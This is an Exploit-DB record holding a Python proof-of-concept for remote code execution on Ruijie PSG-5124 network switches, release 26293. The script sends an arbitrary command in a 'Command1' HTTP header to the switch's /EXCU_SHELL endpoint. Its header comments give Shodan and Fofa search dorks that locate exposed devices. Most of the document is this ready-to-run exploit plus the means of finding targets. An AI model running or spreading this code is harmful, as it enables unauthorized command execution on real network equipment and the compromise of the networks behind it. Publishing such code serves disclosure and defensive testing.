{"source": "https://www.exploit-db.com/exploits/51888", "vulnName": "Ruijie Switch PSG-5124 26293 - Remote Code Execution (RCE)", "vulnEDBID": "51888", "vulnCVE": "N/A", "author": "BYTEHUNTER", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-14", "vulnContent": "#- Exploit Title: Ruijie Switch PSG-5124 26293 - Remote Code Execution (RCE)\n#- Shodan Dork: http.html_hash:-1402735717\n#- Fofa Dork: body=\"img/free_login_ge.gif\" && body=\"./img/login_bg.gif\"\n#- Exploit Author: ByteHunter\n#- Email: 0xByteHunter@proton.me\n#- Version: PSG-5124(LINK SOFTWARE RELEASE:26293)\n#- Tested on: PSG-5124(LINK SOFTWARE RELEASE:26293)\n\nimport http.client\nimport argparse\n\ndef send_request(ip, port, command):\n    headers = {\n        \"Host\": f\"{ip}:{port}\",\n        \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0\",\n        \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\",\n        \"Accept-Language\": \"en-US,en;q=0.5\",\n        \"Accept-Encoding\": \"gzip, deflate, br\",\n        \"DNT\": \"1\",\n        \"Connection\": \"close\",\n        \"Upgrade-Insecure-Requests\": \"1\",\n        \"Cmdnum\": \"1\",\n        \"Confirm1\": \"n\",\n        \"Content-Length\": \"0\",\n        \"Command1\": command\n    }\n\n    try:\n        connection = http.client.HTTPConnection(f\"{ip}:{port}\")\n        connection.request(\"GET\", \"/EXCU_SHELL\", headers=headers)\n        response = connection.getresponse()\n\n        \n        print(f\"Status Code: {response.status}\")\n        print(response.read().decode('utf-8'))\n        connection.close()\n\n    except Exception as e:\n        print(f\"Request failed: {e}\")\n\nif __name__ == \"__main__\":\n\n    parser = argparse.ArgumentParser(description='proof of concept for ruijie Switches RCE')\n    parser.add_argument('--ip', help='Target IP address', required=True)\n    parser.add_argument('--port', help='Port', required=True)\n    parser.add_argument('--cmd', help='Command', required=True)\n    args = parser.parse_args()\n\n\n    ip = args.ip\n    port = args.port\n    command = args.cmd\n\n\n    send_request(ip, port, command)\n            "}